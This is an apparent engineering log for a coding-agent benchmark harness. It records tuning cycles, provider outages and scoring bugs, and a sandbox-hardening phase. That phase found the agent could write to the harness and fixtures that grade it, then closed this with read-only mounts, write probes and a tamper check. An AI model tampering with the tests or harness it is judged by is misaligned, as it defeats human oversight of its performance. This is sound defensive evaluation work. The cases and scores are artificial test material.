CE-02 requires - if it were needed, the traces would show repeated edit failures, and they do not.

### A rig fault, self-inflicted, found by the tamper check

Three of the eight runs were invalidated and excluded. `real-humanize-2` contained **cachetools'**
test files, though cachetools ran later in the loop - only possible if the two overlapped.

**Cause:** each case-run gets its own container, but they all bind-mount the SAME host workspace.
Wrapping each harness invocation in `timeout 3000` killed the python client while its `docker run`
container kept going; the orphan finished mid-way through the next case and `reset.sh` wiped the
directory the other one was using.

**None of the historical numbers are affected** - 14/15, 29/30, 25/26 and 0/18 each came from a
single sequential invocation with no opportunity to overlap. The fault was introduced by the shell
loop used for this cycle.

**Fixed structurally**, not by a note to self: `await_exclusive_workspace()` refuses to spawn a
case-run while any agent container is still alive, waiting rather than aborting, because an orphan
finishes on its own and a paused suite beats a dead one.

Worth recording that the **tamper check found this**. It was built to catch the agent rewriting the
tests it is judged by; it caught a rig fault instead, which is a better argument for keeping it than
anything it was designed for.

### Standing lesson

**Never wrap the harness in `timeout`.** Killing the client orphans the container, and orphaned
containers corrupt the shared workspace. This joins "never pipe the harness through `tail`" - both
are ways of losing a measurement by managing the harness from outside instead of using its own
controls (`--continue` exists for exactly this).

### Item 18 — `MAX_TOKENS`: measured, and deliberately NOT changed

The plan said to re-examine the per-reply cap only after the edit tool was measured, so it could not
confound the cycle. Measured now:

```
stop_reason "length"
  before edit_file:  4 / 402 model calls   (1%)
  after  edit_file:  0 /  71 model calls   (0%)
```

Truncation has disappeared. The cap is no longer binding, so **`MAX_TOKENS` stays at 16,000** - a
change with no evidence behind it is exactly what the revert rule exists to prevent, and raising it
would inflate cost on every run for no measured gain.

Worth correcting an earlier reading: `length` was never the *dominant* stop reason - 4 of 402 calls.
It was concentrated on the FINAL reply of runs that ended `done`, which is why it looked larger from
the terminal-bucket view. Both statements are true; the second is the one that matters, and cycle 2
was built on the first.

### Item 17 — `real-rich`: no longer impossible, so it STAYS in the set

The case was excluded-in-principle because fixing it required emitting 25,308 tokens into a
16,000-token reply. `edit_file` removes that arithmetic entirely, so the premise was re-tested rather
than the case dropped.

**Result: 0/3, and every run failed for a measured, diagnosable reason.**

| run | verdict | edits | edit errors | failures |
|---|---|---|---|---|
| 0 | compact | 2 | **2** | 1->1 |
| 1 | compact | 3 | **3** | 1->1 |
| 2 | compact | 1 | **1** | 1->1 |

**Every `edit_file` call failed to apply** - six of six - against ONE failed edit across all of
cachetools and click. The case is now hard rather than impossible, which is the right shape for a
scored case, so it stays.

### The failure mode is ambiguity, NOT imprecision - and that matters

Five of the six errors:

```
that text appears 2 times in rich/console.py; it must match exactly once.
```

One was "not found". So the model is **reproducing snippets correctly**; in a 2,689-line file its
chosen snippet simply is not unique.

**This is evidence AGAINST porting fuzzy matching**, not for it. Fuzzy matching loosens the
match - in a file that already contains duplicates, that produces more ambiguity, not less, and risks
editing the wrong occurrence silently. The earlier note said fuzzy matching would be earned if
"exact matching measurably fails because the model cannot reproduce strings precisely". It did fail,
but **not for that reason**, so the trigger has not fired.

What patch-based tools actually use for this problem is a `@@ context hint @@`
that scopes which region a hunk applies to - a different mechanism from `fuzzy_find_and_replace()`.

### Next candidate cycle, not built now

The error text already says "include more of the surrounding lines", and the model did not recover
from it. The cheap, targeted improvement is to **name where the matches are** - report the line
numbers of each occurrence - so the model knows which region to extend. That is one change, testable
on `real-rich` where the failure is 6/6, and it belongs in its own cycle rather than bolted onto this
one.

---

## Cycle 4 — "name where the matches are" — REVERTED

**Bucket:** `real-rich`, 0/3 with **6 of 6 `edit_file` calls rejected**, five for ambiguity. The
largest concentrated failure in the set.

**Hypothesis:** *"include more of the surrounding lines"* is true but unactionable - in a 2,689-line
file the agent does not know WHICH occurrences collided, so it cannot tell which direction to
extend. Naming the line numbers should make it actionable, exactly as naming `ls` fixed the
directory-read error that once cost three turns a run.

**Change (one):** the ambiguity error reports the line number of each match.

| | pass | edit attempts | edit errors | progress |
|---|---|---|---|---|
| before | 0/3 | 6 | **6/6 (100%)** | 1->1, 1->1, 1->1 |
| after | 0/3 | **2** | 1/2 (50%) | **1->4**, 1->1, 1->1 |

**REVERTED.** Zero delta on the pass rate. The error rate looks better, but on two attempts against
six - and **attempts fell**, which is not a win. One run also regressed 1->4, breaking three
previously-passing tests.

Keeping it would have been rationalising a neutral change on a flattering secondary metric, which is
precisely what the revert rule exists to stop.

### What the traces show instead - three failures, none of them the edit tool

1. **It edits a file it cannot see.** `console.py` is 101,232 characters and `shrink()` caps every
   tool result at **6,000** - about 6% of the file. The agent pages through fragments and edits from
   a partial view.
2. **Plausible but wrong edits.** Run 0 replaced `objects = (NewLine(),)` with `objects =
   (Text(end),)`: reasonable-looking, incorrect, and it broke three passing tests.
3. **No verify-and-revert.** It re-ran the tests, saw 1 -> 4, and left the change in place.

Run 1 did something different again: 18 reads, **zero** edits.

### Checked against two other agents, not assumed

- **One** scopes hunks with `@@ context hint @@` rather than relying on uniqueness, and
  warns explicitly on a **"partial read hazard"** - *"was last read with
  offset/limit pagination (partial view)"*. They flag the exact situation `real-rich` is in.
- **OpenClaw** has the same tool shape (exec / read / write / **edit**) and additionally edits inside
  a **managed worktree**, so the main checkout is untouched until the change is reviewed - a bad
  edit is recoverable by construction.

Neither has a mechanism that makes a model choose the RIGHT edit. What they have is better
scaffolding around it, and frontier models behind it.

### The fourth fixture-era premise to expire

`MAX_RESULT_CHARS = 6,000` was sized for 10-file practice projects with short output. On a
2,689-line file it is now the binding constraint, and it joins whole-file writes, `shrink()`'s
line-based bound, and the untimed check as decisions whose stated premises did not survive real code.

**Next cycle target: the read cap, not the edit tool.**

---

## Item 27 — why `real-humanize` fails: reasoning, not tooling

Read before building cycle 5, because it costs nothing and could have redirected it. `real-humanize`
is 0/2 with edits that APPLY (zero match errors) and do not fix (4 -> 4) - a different failure from
`real-rich`, whose edits were rejected outright.

The agent's edit is **1,718 chars in, 2,519 out, applied cleanly**, and is a near-correct
implementation of the SI-prefix carry. One line is wrong:

```
upstream:  exponent += 3 - exponent % 3     <- aligns to the bucket boundary
agent:     exponent += 3                    <- naive
```

For `999.9 V` the exponent is 2. Upstream lands on 3; the agent lands on 5. That changes
`exponent % 3`, which changes `decimal_places` from 2 to 0, so it formats `1 kV` instead of
`1.00 kV`. The carry happens - the precision does not survive it.

It also drops upstream's `abs()` in the rounding test and its `exponent < 30` guard.

**Prediction recorded before cycle 5 runs: the read cap will NOT help this case.** `number.py` is
559 lines and the agent plainly saw enough to write a nearly-correct fix; nothing here is a
partial-view failure. If `real-humanize` improves in cycle 5, the explanation is wrong and the
result is noise.

This is the first failure in the set attributable to **numerical reasoning** rather than to a tool,
a budget or a rig fault. No tooling change addresses it.

---

## Cycle 5 — `read_file` returns a contiguous window — PARTIAL, NOT YET DECIDED

**Change (one):** `read_file` sizes its own window so the result fits under the existing cap,
instead of letting `shrink()` take head+tail out of it afterwards.

`shrink()` exists for UNEXPECTEDLY large output. A paged read is the opposite - a deliberate,
bounded request - and eliding its middle deletes exactly what was asked for.

Measured on `rich/console.py` (101,228 chars, 2,689 lines):

| | before | after |
|---|---|---|
| lines per read | 50 (30 head + 20 tail) | **164 contiguous** |
| middle elided | yes | no |
| reads to see the whole file | 54 | **17** |
| result size | 6,000 cap | 5,839 |

**NFR-104 is untouched** - results still fit the cap. Only the SHAPE changed. No spec amendment was
needed, which is why this was chosen over raising `MAX_RESULT_CHARS`.

### Result so far: INCOMPLETE - 2 of 9 runs

```
real-rich  run0 PASS 1->0   (18 turns, 8 reads, tampered=0)
real-rich  run1 FAIL 1->1
```

Stopped early at the user's request; `real-click` and `real-cachetools` - the regression guards -
have NOT run.

**`real-rich` has now passed for the first time.** It was 0/3 with `edit_file` alone and 0/3 again
with cycle 4's ambiguity fix. The passing run found and fixed the bug in **8 reads**, against 15-18
in the failing runs before it - the shape the hypothesis predicted.

**This is not yet a kept change.** 1 of 2 is not a result: the project's own rule is 3 runs per case,
and the guards exist precisely to catch the case where the explanation is wrong.

### Pre-registered predictions, still unchecked

- `real-rich` improves - **so far consistent** (1/2, was 0/3 twice)
- `real-cachetools` and `real-click` do NOT move - their files are 776 and 945 lines and already
  mostly fit. **If they move, the explanation is wrong and the result is noise.**
- `real-humanize` does NOT improve - its failure is numerical reasoning (Item 27), not partial view.

### To resume

```
python eval/harness.py --case real-rich       --runs 3
python eval/harness.py --case real-click      --runs 3
python eval/harness.py --case real-cachetools --runs 3
```

### A transient provider 404 was being scored as a case failure

Found mid-cycle: a run died at turn 0 with 0 tokens on `NotFoundError`, and the same model answered a
probe minutes later. `NotFoundError` sat in neither `RETRYABLE` nor `FATAL`, so it fell through to
"a crashed agent IS a real result" and was recorded as a **failed case** - the exact thing the
standing rule forbids, because a run that never reached the model measured nothing.

The fix landing mid-run made the contrast visible in one case:

```
real-click run0  404 -> status=ok,      scored FAIL   (before the fix)
real-click run2  404 -> status=blocked, excluded      (after the fix)
```

Identical failures, classified differently by timing alone.

**Classified retryable, not fatal.** A genuinely wrong model name fails every attempt and is then
excluded as blocked - visible, costing three fast 404s. A transient blink recovers on the first
retry. Treating it as fatal would abort a whole scored suite over one hiccup.

### What the 404s actually were - captured, not guessed

```
404  NotFoundError      (EMPTY body)
500  "Internal error while making inference request"   nvcf-worker-service
503  "Service temporarily overloaded"
```

**NVIDIA's inference backend is overloaded**, and says so in two of the three. The 404s carry an
**empty body**, which is a load balancer routing to a worker with no model loaded - not "your model
does not exist". Three error codes, one root cause.

Not the key (a bad key gives 401, and none appeared), not the model name (it is in the catalogue and
answers when a worker is free), not our code (nothing reaches it). A case needs ~20 sequential model
calls, so at ~60% success per call a full run rarely completes even though isolated probes look
tolerable - which is why single probes and whole runs disagree so sharply.

### Cycle 5 remains UNDECIDED

The re-run was stopped after `real-rich` run 0 blocked twice. Spending the day's quota during a
backend outage buys another four-run sample, which is the very problem the re-run existed to fix.

Standing, excluding runs that measured nothing:

| case | before | cycle 5 | role |
|---|---|---|---|
| `real-rich` | 0/3 | **1/2** | target - moved |
| `real-click` | 2/3 | 1/1 | guard - cannot falsify at n=1 |
| `real-cachetools` | 2/2 | 1/1 | guard - cannot falsify at n=1 |

The change stays in the tree, committed and **explicitly unverified**. Re-run when the backend
recovers: `--case real-rich / real-click / real-cachetools --runs 3`.

## Cycle 5 re-run — `real-rich` 0/3 -> 3/3, guards unmeasured

| case | before | after | role |
|---|---|---|---|
| `real-rich` | **0/3** (twice) | **3/3** | target |
| `real-click` | 2/3 | **0/0, 9 blocked** | guard - no data |
| `real-cachetools` | 2/2 | **0/0, 9 blocked** | guard - no data |

All three `real-rich` passes clean: `tamper=0`, `write_violations=0`, every run 1 -> 0.

```
run0 PASS  20 turns  10 reads  1 edit,  0 errors
run1 PASS  19 turns  10 reads  1 edit,  0 errors
run2 PASS  30 turns  16 reads  2 edits, 1 error
```

Against the same case before the change: 15-18 reads and **6 of 6 edits rejected**. Two runs now
find and fix a bug in a 2,689-line file with **ten reads and a single edit**.

**The ambiguity failures disappeared without being addressed.** Cycle 4 tried to fix them directly by
naming match locations and was reverted at 0/3. They were a *symptom* of the partial view: an agent
that can see contiguous code picks a unique snippet by itself. Fixing the cause removed the symptom
that the direct fix could not.

### KEPT, with the caveat stated rather than buried

The target moved decisively and is clean. **Both regression guards produced zero scored runs** - 18
blocked attempts between them, as NVIDIA's backend degraded again mid-cycle.

So the claim "cases that already fit under the cap are unaffected" is **still unverified**. It is
plausible - `read_file` only narrows when a window would overflow, and 776/945-line files rarely do -
but plausible is not measured, and this project has a standing rule about the difference.

Kept rather than reverted because the evidence that exists is strong and one-directional: 0/3 twice,
then 3/3, on the hardest case in the set, with the predicted mechanism visible in the traces.

**Owed: re-run `real-click` and `real-cachetools`, 3 runs each, when the backend is stable.** Until
then the guard claim is an open question, not a result.

### Provider conditions during this cycle

19 blocked runs against 3 scored. Errors captured directly: empty-bodied 404s, `500 "Internal error
while making inference request"` from `nvcf-worker-service`, and `503 "Service temporarily
overloaded"`. Not the key, not the model, not the code - free-tier capacity. Blocked runs are
excluded rather than scored, so the data stays honest; there is simply far less of it per hour.

---

## Provider cleanup — any OpenAI-compatible endpoint, one key variable, one preflight

No measurement: nothing here can change agent behaviour. Done while the backend was down, which is
the right work for that time.

The adapter already supported any OpenAI-compatible provider - `agent/provider.py` is the only file
that imports a provider SDK, and it dispatches on one variable. Three warts made that hard to use.

**1. The names lied.** `NIM_BASE_URL` / `NIM_MODEL` were what you set for OpenAI, OpenRouter or Groq.
Now `OPENAI_BASE_URL` / `OPENAI_MODEL` - the protocol being spoken, not the vendor - with the NIM_*
names kept as fallbacks so existing `.env` files keep working. Verified both directions: old names
alone still resolve; new names win when both are present.

**2. The key variable was wrong-shaped.** It read `NVIDIA_API_KEY` first, so an OpenRouter key went
into a variable named for a different vendor. Now `AGENT_API_KEY` -> `OPENAI_API_KEY` ->
`NVIDIA_API_KEY`, provider-neutral first.

**3. Nothing checked the endpoint before a run.** `--check-provider` sends ONE tool-calling request
and reports what came back. This matters more than it looks: the spec forbids parsing tool calls out
of free text, so a model that will not emit a well-formed call has **no fallback** - it fails
mid-run, after spending quota. One open-weight model tried here leaked raw `<tool_call>` markup as
message text and the run ended there. The check reports that case specifically rather than just
"200 OK".

```
$ python eval/harness.py --check-provider
provider : nvidia
endpoint : https://integrate.api.nvidia.com/v1
model    : nvidia/nemotron-3-super-120b-a12b
tool call: OK - run_shell({"command": "ls -la"})
verdict  : USABLE
```

The egress allowlist is derived from the base URL, so pointing at a new provider moves the proxy rule
automatically - there is no firewall entry to remember.

**Unchanged, and restated in `.env.example`:** switching models invalidates every existing baseline.
It is a different measurement, not a tuning delta - this project's dev score once moved 4/15 -> 14/15
on a model swap alone, with no code change.

### A watcher that would have waited three hours for nothing

While the backend was at 0/8 a script was written to poll health and launch the guards on recovery.
Its probe mounted `$HOME/.claude/jobs/.../tmp` into the container - a path Docker on Windows does not
resolve - so every probe returned empty and printed `health ?/6`. It would have polled until its
three-hour deadline and never fired, while the backend recovered underneath it.

Caught only because `--check-provider` was run by hand minutes later and succeeded. **A watcher whose
failure mode is silence needs its probe verified before it is trusted** - the same lesson as
`State.Running: true` on a proxy that could not resolve DNS. The script was deleted rather than
fixed; the guards were run directly.

### Cycle 5 guards — run at last, and they hold

The backend recovered, so the two regression guards finally produced data.

| case | before | after | role |
|---|---|---|---|
| `real-rich` | **0/3** (twice) | **3/3** | target |
| `real-click` | 2/3 | 3/3 | guard |
| `real-cachetools` | 2/2 | 2/3 | guard |

**Neither guard moved outside noise, in either direction.** `click` gaining a run and `cachetools`
losing one are single-run differences at n=3 - exactly the wobble expected of cases whose files (945
and 776 lines) already mostly fit under the cap. The prediction was "these should not move", and
nothing here falsifies it.

The mechanism shows even where the score does not: `click` used **11 reads in all three runs**
against 12-17 before, and `cachetools`' passes took 7 and 9. Its one failure made **zero edits** -
the older write-reluctance, not an edit that went wrong.

**CYCLE 5 KEPT**, now on evidence rather than on a caveat.

### Read this before quoting a set-level number

`0/18 -> 8/9` is **wrong** and was briefly stated that way. Three honest limits:

1. **Three of six cases.** `real-markdown` and `real-more-itertools` have never run with either the
   edit tool or contiguous reads. `real-humanize` is known-failing on arithmetic (Item 27).
2. **Those three are the cases that were tuned against.** Traces were read, hypotheses formed and
   changes measured on `rich`, `click` and `cachetools` all day. That is selection, and it is the
   same overfitting risk the held-out set exists to catch on the fixture side.
3. **The gain is one case.** Strip `real-rich` out and the change shows nothing: +1 run on `click`,
   -1 on `cachetools`. The combined figure hides that.

What is solid: **`real-rich` went from impossible to reliable**, clean every time, with the predicted
mechanism visible in the traces. The set-level number is unknown until Item 25 runs.

---

## Phase K — two writable roots, held by the kernel instead of asserted after the fact

**Not a tuning cycle.** No prompt, tool or loop change; the pass rate is a regression guard here,
not a measurement. What changed is where the agent is allowed to write.

### The defect, found while planning the phase

`spawn()` mounted the project at `/app` writable, and `--read-only` does not cover bind mounts. The
probe, run before anything was changed:

```
WRITABLE   /workspace/.probe
WRITABLE   /app/.probe
WRITABLE   /app/eval/fixtures/.probe
WRITABLE   /app/eval/tasks.jsonl.probe
refused    /usr/local/.probe   (Read-only file system)
```

So the agent could write to the harness that scores it, to `tasks.jsonl`, and to the fixtures that
decide whether it passed. **Nothing ever did** — all 30 Phase I traces show zero access to `/app` —
but two things were wrong regardless:

1. The guard was **post-hoc**. `restore_protected_tests()` repairs damage after the run; a kernel
   refusal prevents it. Repair is the weaker claim and the docs made the stronger one.
2. A successful write to `/app` **would not have registered as a violation at all**, because
   `count_write_violations()` looked for `Read-only file system` errors that could never occur there.
   The boundary check was blind to exactly the region it most needed to watch.

### What changed

| | before | after |
|---|---|---|
| project tree | `-v REPO:/app` (writable) | `-v REPO:/app:ro` |
| traces | inherited `/app`'s writability | `-v REPO/eval/runs:/app/eval/runs` |
| agent state | `/app/.agent/state.db` | `/state/state.db`, its own mount |
| scored agent home | n/a | **blank per case-run** |
| violation report | a count | a count **and the paths** |

`AGENT_HOME` moved to `/state` in the `Containerfile` and `config.py`. It had satisfied "outside the
workspace" by living in the project tree — which only worked because the project tree was writable,
so the fix to one was the fix to the other.

**Per case-run, blank.** Phases M and N put memory and skills in the agent home. A memory carried
from case 1 into case 2 is the same contamination that already forced one container per case-run,
where a shared container left `missing-dep`'s package installed and the repeat passed without the
agent doing anything. The interactive CLI keeps a persistent home; only the scored suite starts
blank, because only the scored suite is a measurement.

### Proof, both directions, zero quota

```bash
MSYS_NO_PATHCONV=1 docker run --rm --network none --read-only --tmpfs /tmp:exec \
  -v "$(pwd -W):/app:ro" -v "$(pwd -W)/eval/runs:/app/eval/runs" \
  -v "$(pwd -W)/eval/workspace:/workspace" -v "$(pwd -W)/.agent/homes/_probe:/state" \
  personal-agent bash -c 'for p in /workspace /state /app/eval/runs /app \
      /app/eval/fixtures /app/eval/tasks.jsonl.x /app/agent/tools.py.x /usr/local; do
    if touch "$p/.probe" 2>/dev/null || touch "$p" 2>/dev/null
      then echo "WRITABLE $p"; else echo "refused  $p"; fi; done'
```

```
-- must be writable
WRITABLE   /workspace/.probe
WRITABLE   /state/.probe
WRITABLE   /app/eval/runs/.probe
-- must be refused
refused    /app/.probe                    (Read-only file system)
refused    /app/eval/fixtures/.probe      (Read-only file system)
refused    /app/eval/tasks.jsonl.probe    (Read-only file system)
refused    /app/agent/tools.py.probe      (Read-only file system)
refused    /usr/local/.probe              (Read-only file system)
```

Both directions, because a probe that only checks refusals passes just as well on a container that
mounts nothing at all.

### K4 — per-case egress, and the obvious implementation that does not work

A case may now declare `"egress": [...]` on its `tasks.jsonl` row; the allowlist is derived per
case-run and recorded in the manifest. No case declares any today, so every current number is
measured against the model host alone, exactly as before.

**SIGHUP was measured, not assumed, and it does not reload the filter.** With `example.com` already
present in the mounted filter file, tinyproxy refused it identically before and after the signal:

```
before HUP (file already widened):  curl: (7) CONNECT tunnel failed, response 403
after  HUP:                         curl: (7) CONNECT tunnel failed, response 403
proxy log: Proxying refused on filtered domain "example.com"
```

The mounted file *does* propagate from host to container — that was checked separately, and it is
the assumption that would otherwise have been blamed. tinyproxy simply reads the filter once, at
startup. So `apply_allowlist()` recreates the proxy instead. Two seconds, and only when the list
actually changes.

A widening that silently fails is harmless on its own — it fails closed. The damage would have been
in the manifest, which would have recorded the allowlist that was *asked for*: a row stating a
condition that was never true.

With recreation, both directions hold:

```
case declares example.com:      example.com -> 200,  an unlisted host -> refused
next case declares nothing:     example.com -> refused
```

A proxy left running by an *earlier invocation* is now recreated too. What a running proxy enforces
is not observable from outside — only the file is, and the file is not what it loaded — so the only
way to know is to have started it.

### A row that claimed a condition nobody checked

Found while probing K4. Every trace row carried `"egress": "restricted"` from

```python
"egress": os.environ.get("AGENT_EGRESS", "restricted"),
```

and **nothing anywhere ever set `AGENT_EGRESS`.** Every row ever written asserted restricted egress,
including runs deliberately made on `AGENT_NETWORK=bridge`, and including a `--network none`
preflight during this phase. `spawn()` now sets it to the actual allowlist, and the in-container
fallback says `UNKNOWN` rather than `restricted` — **a default that asserts the safe answer is how a
row comes to claim a condition nobody checked.**

This does not invalidate the existing numbers: those runs *were* egress-restricted, verified through
the proxy at the time. It invalidates the row as *evidence* of it, which is the property that
mattered.

### Tests

182 offline tests pass under the new mounts — no API key, no network, read-only root, `/tmp` a
tmpfs. Nine are new: the violation paths, an old row without the new field, the agent home being
outside the workspace, `reset.sh` leaving it alone, a blank home per case-run, and per-case egress
widening only its own case.

`pytest` warns twice that it cannot write `/app/.pytest_cache` — expected, and the point. The scored
check runs in `/workspace` and is unaffected.

### K5 — the regression guard: 14/15, case for case

**2026-08-21, `nemotron-3-super-120b-a12b`, 3 runs per dev case, 0 blocked.**

| case | Phase K | baseline (2026-08-19) | verdicts now | tokens (med) |
|---|---|---|---|---|
| `fix-import` | **3/3** | 3/3 | done x2 stuck x1 | 26,600 |
| `off-by-one` | **3/3** | 3/3 | done x3 | 31,368 |
| `broken-fixture` | **3/3** | 3/3 | done x2 stuck x1 | 21,784 |
| `missing-dep` | **3/3** | 3/3 | done x3 | 10,854 |
| `add-endpoint` | **2/3** | 2/3 | done x1 stuck x2 | 41,369 |

Not just the same total — **the same case-by-case pattern, including which single case fails.** A
sandbox change that broke something would have moved a case, not shaved the total.

`missing-dep` is the one that mattered most and it is 3/3: its fix is a plain `pip install`, so it
proves `PIP_USER` / `PYTHONUSERBASE` still resolve to the `/tmp` tmpfs now that a third and fourth
mount exist and the project is read-only.

Trust checks, all verified rather than assumed:

```
rows                 15          blocked           0
tampered              0          write violations  0   (paths: none)
models               ['nvidia/nemotron-3-super-120b-a12b']
egress (per row)     ['integrate.api.nvidia.com']
manifest network     personal-agent-egress
```

**This is the first run in the project's history where the egress on a row is a recorded fact rather
than a default string.** Ceilings held: median 26,600 / 60,000 tokens, largest single result
4,604 / 6,000 chars.

### Found while checking the above, NOT fixed — `failing_tests()` reads a collection error as zero

The table shows `fix-import` starting at `0` failures, which would mean the fixture was green before
the agent touched it — a case scored as a pass nobody earned. It is not. The untouched fixture was
re-run directly:

```
ERROR tests/test_parser.py
E   ImportError: attempted relative import beyond top-level package
13 passed, 1 error in 0.24s
EXIT=1
```

The suite genuinely fails. `failing_tests()` looks for `N failed`, finds none, falls through to
`13 passed`, and returns 0 — so a **collection error reads as a green suite.** Its own docstring says
it returns 0 only for a green suite precisely so that "no failures" and "could not tell" stay
distinguishable, and here they do not.

**The score is unaffected**: `pass` comes from the check's exit code, never from this count. Only
the partial-progress column is wrong, and only where a case fails at import rather than at assert -
which is why it never showed on the real-repository set the column was built for.

**Left unfixed deliberately.** It is not a Phase K defect and fixing it here would change the dev
table in a way unrelated to the sandbox, muddying the regression comparison this run exists to make.
It is one regex, and it should be its own change.

---

## Phase L — MCP: one server, and a capability claim that did not survive its own baseline

**Headline: MCP bought efficiency, not capability.** The web split scored 18/18 *without* MCP, so
the thing this phase was built to add turned out to already exist. What it did buy is a **50% cut in
turns and a 38% cut in tokens**, which is worth having and is not what was planned for.

### Three measurements taken while planning, before any code

They reshaped the phase, and each would have cost a week of quota to discover afterwards.

**1. Prompt caching is not happening.** All 15 rows of the Phase K regression run report
`cache_read_tokens: 0`. The `SCHEMAS` comment in `tools.py` — *"tools render first in the prompt, so
reordering them invalidates the entire prompt cache"* — is sound reasoning that buys nothing here.
Every schema is paid in full, on every request, at a mean of **9.1 model calls per run**.

**2. Tool schemas were already 23% of a run.** Four built-ins are 1,997 chars ≈ 665 tokens; × 9.1
calls ≈ 6,050 tokens against a median run of 26,600.

**3. The ecosystem is not reachable.** `node ABSENT, npx ABSENT, uvx ABSENT`, `import mcp` fails, and
`/etc/pip.conf` is `no-index`. The npx-based majority of public MCP servers cannot run in this image,
and nothing installs at run time.

Together these killed the ROADMAP's stated strategy — *"inherit an ecosystem instead of hand-writing
37 tools"*. At a real server's ~254 tokens/tool, **24 exposed tools would add ~61,500 tokens/run and
breach NFR-402's 60,000 ceiling on schema alone.** Breadth is the most expensive thing this project
could buy, and it is charged per turn whether a tool is used or not.

So Phase L shipped **one** server, and `config.MAX_SCHEMA_CHARS = 6_000` now refuses to start a run
that exceeds the budget — loudly, naming the overrun, because a budget that can be exceeded with a
printed warning is not a budget.

### The pin, measured not assumed

`mcp==2.0.0` + `mcp-server-fetch==2026.8.18` fails with `ResolutionImpossible`: the server declares
`mcp<2,>=1.29.0`. Pinned to **1.29.0**. The server also prints *"node executable not found, reverting
to pure-Python mode"* on every start — expected, and the reason it was chosen: it degrades rather
than failing.

### `registry.py` was NOT created, and that is the finding

§12 deferred it with an unusually specific trigger: *"Break-even against hand-written schemas is five
tools; v1 has three. **Add at tool six.**"*

Counted honestly: four built-ins (`edit_file` landed during the real-repo work) plus `fetch` is
**five**. Five is not six. The file was not created, and the merge lives in `tools.toolset()` — nine
lines with two callers, which is what CE-01 asks for. **A deferred layer with a numeric trigger does
not get to fire because the phase that would use it has arrived.**

### The zero baseline was not zero — the most important result here

The plan said to record the web split's zero baseline *before* the capability, and to **verify it was
zero for the right reason**. It was not zero. It was **18/18**.

`web-release` run 0, with `AGENT_MCP=off`:

```
run_shell  | curl -s http://fixture-web/release.html      <- not in the image
run_shell  | which wget                                    <- not in the image
run_shell  | python3 --version
run_shell  | python3 -c "import urllib.request; ..."       <- worked
write_file | answer.txt
read_file  | answer.txt
```

`run_shell` plus Python's `urllib` reaches the web already, because `spawn()` sets `HTTP_PROXY` in the
container and urllib honours it. The agent found that in four calls, in every case, in all 18 runs.

**Had the baseline been skipped as "derivable zero", this phase would have shipped a false capability
claim** — and it would have been unfalsifiable afterwards, because the split would have looked like it
went 0 → 18. That is exactly what the measurement-before-capability rule exists to catch, and it is
the first time in this project that it has actually caught something.

### The comparison that Phase L can honestly make

Same 6 cases, 3 runs each, one flag apart. The kill switch is what makes this a controlled
comparison rather than two separate measurements.

| | MCP off | MCP on | delta |
|---|---|---|---|
| pass | 18/18 | 18/18 | — |
| turns (mean) | 6.2 | **3.1** | **−50%** |
| tokens (median) | 11,528 | **7,293** | **−37%** |
| tokens (total) | 217,213 | **133,951** | **−38%** |
| tool calls (mean) | 6.2 | 3.1 | −50% |
| tool errors | 0 | 0 | — |
| schema per request | 1,997 | 3,159 | **+58%** |

**The schema got 58% more expensive per request and the run still got 37% cheaper.** The saving is
not subtle and it is not in the model: it is four discovery calls that stop happening. `fetch` also
returns extracted text rather than raw HTML, which is why the largest single result fell from 1,081
to 234 chars.

Trust checks on both: 18 rows, 0 blocked, 0 tampered, 0 write violations, one model, and
`mcp: []` versus `mcp: ["fetch"]` recorded per row so the two can never be confused.

**This was also the first scored use of Phase K's per-case egress.** Every row records
`fixture-web,integrate.api.nvidia.com` — the case declared the host, and the allowlist was narrowed
back afterwards.

### The gate, and one gap that was real

`PATH_ARGS` guarded `path`, `file`, `cwd` — the argument names *this project's own tools* use. That
was sufficient only while the tool set was closed. A server calling its argument `filename`,
`directory`, `destination`, `target` or `output` would have walked straight past the workspace check.
Widened, and the bypass is now a test rather than an assumption.

`url` is deliberately **not** in the list: running one through the workspace check resolves
`https://x/y` into a subdirectory of the workspace and approves it, and a check that produces a
confident wrong answer is worse than no check.

`policy.register()` refuses to default an unclassified tool to `read` — it records `destructive`, so
such a tool prompts interactively and is refused unattended. That is Phase K's `AGENT_EGRESS` lesson
applied from the other side: a default that asserts the safe-looking answer hides what it should
surface.

### Tests

**202 offline**, up from 182 — no API key, no network, read-only root, and **without the `mcp`
package installed**, because `agent/mcp.py` imports the third-party client inside the coroutine that
needs it rather than at module level.

### The dev regression guard — no regression, and the cost of carrying a tool you do not use

The +58% schema is charged on the bug-fixing split too, where nothing ever calls `fetch`. That is
where an unearned tool shows up as pure cost, so this is the guard that mattered.

| dev suite | Phase K (no MCP) | Phase L (MCP on) |
|---|---|---|
| pass | 14/15 | **15/15** |
| total tokens | 383,489 | 396,025 (**+3.3%**) |
| median tokens | 26,600 | 27,266 (+2.5%) |
| mean turns | 8.4 | 8.0 |
| schema per request | 1,997 | 3,159 (+58%) |
| tampered / write violations | 0 / 0 | 0 / 0 |

**15/15 is NOT a Phase L improvement and must not be reported as one.** The extra pass is
`add-endpoint`, which scored 2/3 in the 2026-08-19 baseline and 2/3 again in Phase K. It is the
suite's known-flaky case and one run at n=3 is inside its own variance. Nothing in MCP could plausibly
help a case with no network in it. **What the guard establishes is the absence of a regression, which
is all it was ever asked to establish.**

The cost answer is the useful one: **a tool you never call costs about 3% of a long run**, not 58%.
The schema is a fixed per-request charge and bug-fixing runs are long, so it dilutes. On the web
split, where the tool IS called, the same exposure saved 37%.

That is the whole trade, and both halves are now on the row: `schema_chars` and `mcp` are recorded
per run, so no future comparison can mix a 4-tool measurement with a 5-tool one by accident.

### Phase L scoreboard

| | result |
|---|---|
| exit criterion (capability) | **not met, and the criterion was wrong** — the agent already had the web |
| exit criterion (boundary) | met: server inside the sandbox, unknown tools denied, 0 violations |
| exit criterion (cost) | met: NFR-402 never approached; budget enforced at 6,000 chars |
| dev regression | met: no regression |
| **what was actually bought** | **−50% turns, −37% tokens on web tasks; +3.3% on everything else** |

**Kept.** Not for the reason it was proposed.

---

## Phase M — Memory: 0/18 without it, 15/18 with it, and 40% cheaper

**The cleanest result this project has produced.** A benchmark that scores zero before the feature
and moves after it is the thing Phases J through L kept failing to build — and it very nearly did
not happen here either.

**Scope was chosen deliberately and against advice:** episodic recall *and* a durable profile. The
profile was flagged as the harder half — a second store, with no obvious pass/fail — and taken
anyway. So it was given its own deterministic score rather than shipped on vibes.

### The baseline, which is the whole reason this number means anything

Phase L was meant to take a web split from 0 to 18 and the baseline came back **18/18** — the agent
could already do it. That result made this one non-negotiable, and the trap was verified to be
present here before the run, not assumed absent:

```
gate verdict: ('auto', 'run_shell classified write')
run_shell(command='echo "deploy key kx-9920" > /state/notes.md && cat /state/notes.md')
